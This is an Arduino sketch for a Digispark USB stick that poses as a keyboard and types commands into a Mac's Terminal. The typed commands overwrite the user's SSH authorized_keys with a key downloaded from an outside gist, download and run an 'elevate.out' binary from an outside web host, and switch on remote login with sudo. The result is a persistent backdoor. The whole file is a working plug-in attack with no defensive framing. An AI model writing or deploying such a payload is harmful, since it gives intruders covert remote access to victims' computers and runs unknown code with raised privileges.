#include "DigiKeyboard.h"

void setup() {
    // initialize the digital pin as an output.
    pinMode(0, OUTPUT); // LED on Model B
    pinMode(1, OUTPUT); // LED on Model A
    
    // Some systems require this
    DigiKeyboard.sendKeyStroke(0);

    // Turn on LED
    digitalWrite(0, HIGH);
    digitalWrite(1, HIGH);

    // Keyboard setup GUI will flash up when you plug in. Wait 10 seconds to avoid this.
    //DigiKeyboard.delay(10000);

    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
    DigiKeyboard.delay(50);
    DigiKeyboard.print("term");
    DigiKeyboard.delay(10000);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(5000);
    DigiKeyboard.sendKeyStroke(KEY_C, MOD_CONTROL_LEFT);
    DigiKeyboard.delay(50);
    // Type out commands letter by letter (assumes US-style keyboard)
    DigiKeyboard.println("mkdir -p ~/.ssh");
    DigiKeyboard.delay(50);
    DigiKeyboard.println("mv ~/.ssh/authorized_keys ~/.ssh/authorized_keys_old");
    DigiKeyboard.delay(50);
    DigiKeyboard.println("curl https://gist.githubusercontent.com/ErikBoesen/3d24a2bda89f932e4c1a93a622b53704/raw --output ~/.ssh/authorized_keys");
    DigiKeyboard.delay(5000);
    DigiKeyboard.println("curl -O http://erikboesen.com/downloads/elevate.out");
    DigiKeyboard.delay(5000);
    DigiKeyboard.println("chmod +x ./elevate.out");
    DigiKeyboard.delay(50);
    DigiKeyboard.println("./elevate.out");
    DigiKeyboard.delay(2000);
    // Set path in order to use commands as below without error
    DigiKeyboard.println("export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin");
    // Open ssh service, accessible for all users
    DigiKeyboard.println("sudo systemsetup -setremotelogin on");
    DigiKeyboard.delay(50);
    DigiKeyboard.println("exit");

    // Turn off LED
    digitalWrite(0, LOW);
    digitalWrite(1, LOW);

    // Ensure computer knows that keyboard is alive
    DigiKeyboard.delay(10);
}


void loop() {
    // this is generally not necessary but with some older systems it seems to
    // prevent missing the first character after a delay:
    //exit(0);
}

